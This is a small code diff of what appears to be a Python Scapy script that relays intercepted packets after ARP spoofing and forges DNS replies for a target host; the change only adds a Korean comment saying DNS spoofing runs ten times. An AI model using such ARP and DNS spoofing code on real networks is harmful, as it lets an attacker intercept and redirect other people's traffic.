@@ -90,6 +90,7 @@ def arp_monitor_callback(pkt):
 	else:
 		#ARP외의 모든 패킷 RELAY
 		if pkt[IP].src==des_ip:
+			# 10번만 dns spoofing 함 
 			if (pkt.haslayer(DNS)) and  (dns_count < 10) :
 				ip = pkt.getlayer(IP)
 				udp = ip.payload
